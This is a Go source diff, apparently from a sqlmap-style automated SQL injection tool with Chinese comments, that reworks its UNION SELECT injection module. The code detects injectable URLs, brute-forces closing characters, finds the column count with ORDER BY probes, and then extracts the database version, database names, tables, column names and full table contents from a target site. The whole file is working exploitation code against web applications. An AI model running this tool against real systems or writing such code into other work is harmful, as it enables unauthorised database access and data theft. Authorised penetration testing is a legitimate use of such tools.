@@ -12,6 +12,7 @@ import (
 	"time"
 )
 
+// DetectUnionSelectSqlInject 检测是否存在Union Select注入
 func DetectUnionSelectSqlInject(url string, method string) (bool, string) {
 	for _, v := range constant.SuffixList {
 		innerUrl := url + v
@@ -19,47 +20,65 @@ func DetectUnionSelectSqlInject(url string, method string) (bool, string) {
 		if code != -1 {
 			if strings.Contains(strings.ToLower(string(body)),
 				strings.ToLower(constant.DetectedKeyword)) {
-				log.Info("detected error based sql injection!")
+				log.Info("detected union select sql injection!")
 				return true, innerUrl
 			}
 		}
 	}
-	log.Info("not detected error based sql injection!")
+	log.Info("not detected union select sql injection!")
 	os.Exit(-1)
 	return false, ""
 }
 
-func GetSuffix(target string) (bool, string) {
+// GetSuffix 获取可能的闭合符号列表
+func GetSuffix(target string) (bool, []string) {
 	_, _, defaultBody := util.Request(constant.DefaultMethod, target, nil, nil)
+	var suffixList []string
 	for _, v := range constant.SuffixList {
-		payload := target + v + constant.ErrorBasedSuffixPayload
-		_, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
-		if string(defaultBody) == string(body) {
-			return true, v
+		condition := target + v + constant.UnionSelectSuffixCondition
+		_, _, conditionBody := util.Request(constant.DefaultMethod, condition, nil, nil)
+		payload := target + v + constant.UnionSelectSuffixPayload
+		_, _, payloadBody := util.Request(constant.DefaultMethod, payload, nil, nil)
+		// 双重验证只能尽量保证闭合符号正确，还需要OrderBy中验证
+		if string(defaultBody) == string(payloadBody) &&
+			string(defaultBody) == string(conditionBody) {
+			suffixList = append(suffixList, v)
 		}
 	}
-	return false, ""
+	if len(suffixList) > 0 {
+		return true, suffixList
+	}
+	return false, suffixList
 }
 
-func GetOrderByNum(suffix string, url string) int {
+// GetOrderByNum 用Order By语句检测出真正的闭合符号并得到列数
+func GetOrderByNum(suffixList []string, url string) (string, int) {
 	for i := 1; ; i++ {
-		payload := url + suffix + constant.Space + constant.ErrorBasedOrderPayload +
-			constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
-		code, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
-		if code != -1 {
-			if strings.Contains(strings.ToLower(string(body)),
-				strings.ToLower(constant.OrderKeyword)) {
-				return i
+		for _, suffix := range suffixList {
+			// 一般表的字段数不可能超过100个
+			if i > 100 {
+				return "", 0
+			}
+			payload := url + suffix + constant.Space + constant.UnionSelectOrderPayload +
+				constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
+			code, _, body := util.Request(constant.DefaultMethod, payload, nil, nil)
+			if code != -1 {
+				// 得到最终正确的闭合符号
+				if strings.Contains(strings.ToLower(string(body)),
+					strings.ToLower(constant.OrderKeyword)) {
+					return suffix, i
+				}
 			}
 		}
 	}
 }
 
+// GetUnionSelectPos 根据得到的列数得到页面回显索引
 func GetUnionSelectPos(suffix string, url string, key int) Pos {
-	url = url + constant.ErrorBasedUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	unionSql := bytes.Buffer{}
 	unionSql.WriteString(url + suffix + constant.Space +
-		constant.ErrorBasedUnionSelect + constant.Space)
+		constant.UnionSelectUnionSql + constant.Space)
 	rand.Seed(time.Now().UnixNano())
 	randMap := make(map[int]int)
 	for i := 1; i < key; i++ {
@@ -94,11 +113,12 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 	return pos
 }
 
+// GetVersion 根据已有的条件得到数据库版本信息
 func GetVersion(pos Pos, suffix string, url string, key int) string {
-	url = url + constant.ErrorBasedUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	versionSql := bytes.Buffer{}
 	versionSql.WriteString(url + suffix + constant.Space +
-		constant.ErrorBasedUnionSelect + constant.Space)
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		versionSql.WriteString(constant.VersionFunc + ",")
 	}
@@ -115,11 +135,12 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 	return ""
 }
 
+// GetCurrentDatabase 根据已有的条件得到当前数据库名
 func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
-	url = url + constant.ErrorBasedUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	databaseSql := bytes.Buffer{}
 	databaseSql.WriteString(url + suffix + constant.Space +
-		constant.ErrorBasedUnionSelect + constant.Space)
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		databaseSql.WriteString(constant.DatabaseFunc + ",")
 	}
@@ -136,9 +157,10 @@ func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
 	return ""
 }
 
+// GetAllDatabases 根据已有的信息得到所有的数据库名
 func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
-	url = url + constant.ErrorBasedUnionCondition
-	database := constant.ErrorBasedUnionSelect
+	url = url + constant.UnionSelectUnionCondition
+	database := constant.UnionSelectUnionSql
 	databaseSql := bytes.Buffer{}
 	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
 	for i := 1; i < key; i++ {
@@ -159,10 +181,11 @@ func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
 	return ""
 }
 
+// GetAllTables 根据已有的信息得到某数据库中所有的表
 func GetAllTables(pos Pos, suffix string, url string, key int, database string) string {
-	url = url + constant.ErrorBasedUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	tableSql := bytes.Buffer{}
-	tableSql.WriteString(url + suffix + constant.Space + constant.ErrorBasedUnionSelect + constant.Space)
+	tableSql.WriteString(url + suffix + constant.Space + constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		tableSql.WriteString("group_concat(table_name),")
 	}
@@ -181,11 +204,12 @@ func GetAllTables(pos Pos, suffix string, url string, key int, database string) 
 	return ""
 }
 
+// GetColumns 根据已有的信息得到某表中的所有字段名
 func GetColumns(pos Pos, suffix string, url string, key int, database string, tableName string) string {
-	url = url + constant.ErrorBasedUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	columnSql := bytes.Buffer{}
 	columnSql.WriteString(url + suffix + constant.Space +
-		constant.ErrorBasedUnionSelect + constant.Space)
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		columnSql.WriteString("group_concat(column_name),")
 	}
@@ -205,11 +229,12 @@ func GetColumns(pos Pos, suffix string, url string, key int, database string, ta
 	return ""
 }
 
+// GetData 根据已有的信息得到某表所有数据
 func GetData(pos Pos, suffix string, url string, key int, database string, tableName string, columns []string) {
-	url = url + constant.ErrorBasedUnionCondition
+	url = url + constant.UnionSelectUnionCondition
 	dataSql := bytes.Buffer{}
 	dataSql.WriteString(url + suffix + constant.Space +
-		constant.ErrorBasedUnionSelect + constant.Space)
+		constant.UnionSelectUnionSql + constant.Space)
 	for i := 1; i < key; i++ {
 		prefix := "group_concat("
 		for _, v := range columns {
